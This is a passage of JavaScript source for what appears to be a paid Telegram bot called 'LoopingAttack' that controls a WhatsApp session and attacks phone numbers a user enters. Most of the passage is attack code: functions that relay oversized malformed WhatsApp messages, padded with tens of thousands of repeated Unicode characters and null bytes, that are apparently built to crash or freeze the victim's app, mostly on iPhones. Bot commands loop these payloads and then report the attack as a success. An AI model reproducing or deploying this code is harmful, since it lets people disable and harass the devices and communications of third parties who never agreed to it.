								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/raditx7",
								"mediaUrl": "https://www.instagram.com/raditx7",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/raditx7"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
                 participant: {
                 jid: jid
                }
               } : {}
			);
		};
		
async function IpLocation(sock, jid) {
  try {
    const IphoneCrash = "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡" + "𑇂𑆵𑆴𑆿".repeat(60000);
    await sock.relayMessage(jid, {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "\u0000               " + IphoneCrash,
        url: "https://youtube.com/@zahranDev"
      }
    }, {
      participant: { jid: jid }
    });
  } catch (error) {
    console.error("ERROR SENDING IOSTRAVA:", error);
  }
}	

async function RInvisIphone(sock, jid) {
sock.relayMessage(
jid,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: jid,
  },
}, 
{
  messageId: null
}
);
}

async function ransblankip(sock, jid) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋" + "ી".repeat(12000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(12000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(jid, messsage, {
            userJid: jid,
        });
    }
    catch (err) {
        console.log(err);
    }
}

async function RansCrashIos(sock, jid) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await sock.relayMessage(jid, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡͢ 𝐈͡𝐎𝐒͜" + IphoneCrash,
                                           url: "https://youtube.com/@zahranDev"
                                   }
                           }, {
			                  participant: { jid: jid }
		              		  });
                           console.log("Send Bug By Strom light");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
}

async function nolosios(sock, jid) {
sock.relayMessage(
jid,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡 " + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: jid,
  },
}, 
{
  messageId: null,
}
);
}

async function RansSupIos(sock, jid) {
      sock.relayMessage(
        jid,
        {
          extendedTextMessage: {
            text: `𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ios -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: jid,
              participant: jid,
              quotedMessage: {
                conversation: "𝐵⃪𝐿⃪𝐴⃪𝑁⃪𝐾 𝐼⃪𝑂⃪𝑆 ‌" + "꧒꧆".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: jid,
          },
        },
        {
          messageId: null,
        }
      );
    }

async function ComboIos(sock, jid) {
for (let i = 0; i < 10; i++) { 
await paymenX(jid)
await PayXDocInvis(jid)
await protoxaudio2(jid, true)
await nolosios(sock, jid)
await RInvisIphone(sock, jid)
await IpLocation(sock, jid)
await TxIos(sock, jid)
await RansCrashIos(sock, jid)
await RansSupIos(sock, jid)
await nolosios(sock, jid)
await RInvisIphone(sock, jid)
await IpLocation(sock, jid)
await TxIos(sock, jid)
await RansCrashIos(sock, jid)
await RansSupIos(sock, jid)
await nolosios(sock, jid)
await RInvisIphone(sock, jid)
await IpLocation(sock, jid)
await TxIos(sock, jid)
await RansCrashIos(sock, jid)
await RansSupIos(sock, jid)
await nolosios(sock, jid)
await RInvisIphone(sock, jid)
await IpLocation(sock, jid)
await TxIos(sock, jid)
await RansCrashIos(sock, jid)
await RansSupIos(sock, jid)
}
}

async function uisystemBug(sock, jid) {
for (let i = 0; i < 10; i++) { 
await BaccaratUi(sock, jid)
await RkBlankNotif(sock, jid, ptcp = true)
await NaviFlex(sock, jid)
await BaccaratUi(sock, jid)
await RkBlankNotif(sock, jid, ptcp = true)
await NaviFlex(sock, jid)
await BaccaratUi(sock, jid)
await RkBlankNotif(sock, jid, ptcp = true)
await NaviFlex(sock, jid)
await BaccaratUi(sock, jid)
await RkBlankNotif(sock, jid, ptcp = true)
await NaviFlex(sock, jid)
}
}
// FUNC DELAY X DURATION
async function xproto(sock, durationHours, jid) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 100) {
        ZxDelay(sock, jid, false) // Function
        await new Promise((resolve) => setTimeout(resolve, 500));
        console.log(chalk.red(`Send Bug By LoopingAttack🦋 ${count}/100 To ${jid}`));
        count++;
        setTimeout(sendNext, 500);
      } else {
        console.log(chalk.green(`SUCCESS SEND 100 MESSAGE ✅`));
        count = 0;
        console.log(chalk.blue("NEXT SEND 100 MESSAGE ☠️"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };
  sendNext();
}
// ENDS FUNC BUG 

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isPremium(userId) {
  try {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.includes(userId.toString());
  } catch (error) {
    console.error("Error checking premium status:", error);
    return false;
  }
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `( 🦋 )こんにちは  さん。メニューを表示したい場合は と入 @ibradecode 力しないでください。間違いです。
sala bego ketik /menu untuk memunculkan menu`);  
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
        
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// COMMAND BUG \\
bot.onText(/\/visibledelay(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /ᴠɪsɪʙʟᴇᴅᴇʟᴀʏ <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /ᴠɪsɪʙʟᴇᴅᴇʟᴀʏ <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ᴠɪsɪʙʟᴇ`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/mpcjvi.jpg", {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : ᴠɪsɪʙʟᴇᴅᴇʟᴀʏ 
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @ibradecode`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 10; i++) {
      await xproto(sock, 24, jid)
      await RansSuperDelay(sock, jid) 
      await bulldozer1GB(sock, jid)
    }

  } catch (error) {
    console.error("Error in visibledelay:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/xbulldozer(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /xʙᴜʟʟᴅᴏᴢᴇʀ <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /xʙᴜʟʟᴅᴏᴢᴇʀ <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ᴠɪsɪʙʟᴇ`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/mpcjvi.jpg", {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : ᴠɪsɪʙʟᴇᴅᴇʟᴀʏ 
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @ibradecode`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 10; i++) { 
      await bulldozer1GB(sock, jid)
      await bulldozer1GB(sock, jid)
    }

  } catch (error) {
    console.error("Error in proto8:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/xrelogforce(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /xʀᴇʟᴏɢғᴏʀᴄᴇ <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /xʀᴇʟᴏɢғᴏʀᴄᴇ <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇᴠɪsɪʙʟᴇ`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/mpcjvi.jpg", {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇ
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @ᴀʟᴡᴀʏsᴄᴀʟᴢᴢᴢ`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await CrashInvisble(jid)
      await CrashInvisble(jid)
      await CrashX(jid)
      await CrashZ(jid)
      await ComboIos(sock, jid)
    }

  } catch (error) {
    console.error("Error in ios:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/strombeta(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /ᴛᴡᴇʟᴠᴇʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /ᴛᴡᴇʟᴠᴇʙᴇᴛᴀ <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇ ʙᴇᴛᴀ`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/mpcjvi.jpg", {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇ ʙᴇᴛᴀ
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @ᴀʟᴡᴀʏsᴄᴀʟᴢᴢᴢ`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 21; i++) {
      await CrashInvisble(jid)
      await CursorpCrLX(sock, jid)
      await CursorCrL(sock, jid)
      await CursorpCrLX(sock, jid)
      await CursorCrL(sock, jid)
    }

  } catch (error) {
    console.error("Error in fcbeta:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/xkill-ui(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `\`\`\`
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /xᴋɪʟʟ-ᴜɪ <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /xᴋɪʟʟ-ᴜɪ <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ᴜɪsɪsᴛᴇᴍ\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/mpcjvi.jpg", {
    caption: `\`\`\`
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇ ʙᴇᴛᴀ
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @ᴀʟᴡᴀʏsᴄᴀʟᴢᴢᴢ\`\`\``,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 1; i++) {
      await uisystemBug(sock, jid, true) 
      await uisystemBug(sock, jid, true) 
    }

  } catch (error) {
    console.error("Error in uisystem:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/visibleforce(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /ᴠɪsɪʙʟᴇғᴏʀᴄᴇ <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /ᴠɪsɪʙʟᴇғᴏʀᴄᴇ <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇ ɪɴᴠɪs`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/mpcjvi.jpg", {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇ ɪɴᴠɪs
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @ibradecode`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 6; i++) {
      await CrashInvisble(jid)
      await CrashInvisble(jid)
      await CursorpCrLX(sock, jid)
      await CursorCrL(sock, jid)
      await ForceCloseNew(sock, jid)
    }

  } catch (error) {
    console.error("Error in forceDelay:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
// BUTTONS MENU
const mainMenuButtons = {
  reply_markup: {
    inline_keyboard: [
      [{
         text: "𝐎wnerMenu꙳⟅🍁", 
         callback_data: "owner"
      },{ 
         text: "༑𝐁ugMenu꙳⟅🦠", 
         callback_data: "bugmenu" 
      }],
      [{
         text: "Developer", 
         url: "t.me/ibradecode" 
      }],
      [{ 
         text: "TqTo⟅🍷", 
         callback_data: "tq" 
      }],
    ],
  },
};

// BUTTON BACK
const menuWithBackButton = {
  reply_markup: {
    inline_keyboard: [
      [{ 
        text: "⬅️ Back",
        callback_data: "back" 
      }],
    ],
  },
};

function checkAndGetImagePath(imageName) {
  const imagePath = path.join(
    __dirname, 
    "assets", 
    "images",
    imageName
  );
  if (!fs.existsSync(imagePath)) {
    throw new Error("File gambar tidak ditemukan");
  }
  return imagePath;
}

bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const timescale = getUptime();
  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
      caption: `
    \`\`\`LoopingAttack🦋
     ) こんにちは、すべての購入者様、@ibradecode がデザインしたこの最新バージョンへようこそ\`\`\`

〣 🦋メニュースクリプト🦋 〣
—  〢 開発者 : @ibradecode
—  〢 バージョン : 5.0 sᴘᴇᴄɪᴀʟ ᴠᴇʀsɪᴏɴ
—  〢 言語 : ᴊs
—  〢 オンライン : 🫦🫦`,
      parse_mode: "Markdown",
      ...mainMenuButtons,
    });
  } catch (error) {
    console.error("Error sending menu:", error);
    await bot.sendMessage(
      chatId,
      `
    \`\`\`LoopingAttack🦋
( 🦋 ) こんにちは、すべての購入者様、@ibradecode がデザインしたこの最新バージョンへようこそ\`\`\`

〣 🦋メニュースクリプト🦋 〣
—  〢 開発者 : @ibradecode
—  〢 バージョン : 5.0 sᴘᴇᴄɪᴀʟ ᴠᴇʀsɪᴏɴ
—  〢 言語 : ᴊs
—  〢 オンライン : 🫦🫦`,
      {
        parse_mode: "Markdown",
        ...mainMenuButtons,
      }
    );
  }
});

bot.on("callback_query", async (query) => {
  await bot.answerCallbackQuery(query.id).catch(console.error);
 const timescale = getUptime();
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  let caption;
  let buttons;

  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    switch (query.data) {
      case "owner":
        caption = `
〣 🦋オーナーメニュー🦋 〣
—  〢 /ᴀᴅᴅʙᴏᴛ  ⌁  <ɴᴜᴍʙᴇʀ>
—  〢 /ᴀᴅᴅᴘʀᴇᴍ  ⌁  <ɪᴅ>
—  〢 /ᴅᴇʟᴘʀᴇᴍ  ⌁  <ɪᴅ>
—  〢 /ᴀᴅᴅᴏᴡɴᴇʀ  ⌁  <ɪᴅ>
—  〢 /ᴅᴇʟᴏᴡɴᴇʀ  ⌁  <ɪᴅ>`;
        buttons = menuWithBackButton;
        break;

      case "bugmenu":
        caption = `
〣 🦋メニューバグリスト🦋 〣
•  /xᴋɪʟʟ-ᴜɪ  -  <𝟼𝟸xxx>
—  〢  ⌁  <ᴜɪsɪsᴛᴇᴍ>
•  /ᴠɪsɪʙʟᴇᴅᴇʟᴀʏ  -  <𝟼𝟸xxx>
—  〢  ⌁  <ɪɴᴠɪsɪʙʟᴇ>
•  /xʀᴇʟᴏɢғᴏʀᴄᴇ  -  <𝟼𝟸xxx>
—  〢  ⌁  <ғᴏʀᴄᴇʀᴇʟᴏɢ>
•  /xʙᴜʟʟᴅᴏᴢᴇʀ  -  <𝟼𝟸xxx>
—  〢  ⌁  <ᴅᴇʟᴀʏ+ᴅʀᴀɪɴᴋᴜᴏᴛᴀ>
•  /ᴠɪsɪʙʟᴇғᴏʀᴄᴇ  -  <𝟼𝟸xxx>
—  〢  ⌁  <ғᴏʀᴄᴇᴄʟᴏsᴇɪɴᴠɪs>
•  /ꜱᴛʀᴏᴍʙᴇᴛᴀ  -  <𝟼𝟸xxx>
—  〢  ⌁  <ғᴏʀᴄᴇʙᴇᴛᴀ>`;
        buttons = menuWithBackButton;
        break;
case "tq":
        caption = `
〣 🦋ありがとう🦋 〣
⌁ IbraDecode ( Developer )
⌁ RizzXD ( Support )
⌁ DitthV ( Support )
⌁ Archi ( Support )
⌁ Always calzzz ( Support )
⌁ Sarip444 ( Support )
⌁ Fall ( Support )
⌁ AlwaysNuu ( Support )
⌁ Danz X9 ( Support )
⌁ Xstrom ( Support )
⌁ Aʟʟ Pᴀʀᴛɴᴇʀ brra
⌁ Aʟʟ Bᴜʏᴇʀ Sᴄʀɪᴘᴛ ( Yᴏᴜ )`;
        buttons = menuWithBackButton;
        break;
        
      case "back":
        caption = `
    \`\`\`LoopingAttack🦋
 ( ϟ ) こんにちは、すべての購入者様、@ibradecode がデザインしたこの最新バージョンへようこそ\`\`\`

〣 🦋メニュースクリプト🦋 〣
—  〢 開発者 : @ibradecode
—  〢 バージョン : 5.0 sᴘᴇᴄɪᴀʟ ᴠᴇʀsɪᴏɴ
—  〢 言語 : ᴊs
—  〢 オンライン : ${timescale}`,
        buttons = mainMenuButtons;
        break;
    }

    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      ...buttons,
    });
  } catch (error) {
    console.error("Error handling callback query:", error);
    await bot.sendMessage(chatId, caption, {
      parse_mode: "Markdown",
      ...buttons,
    });
  }
});

bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
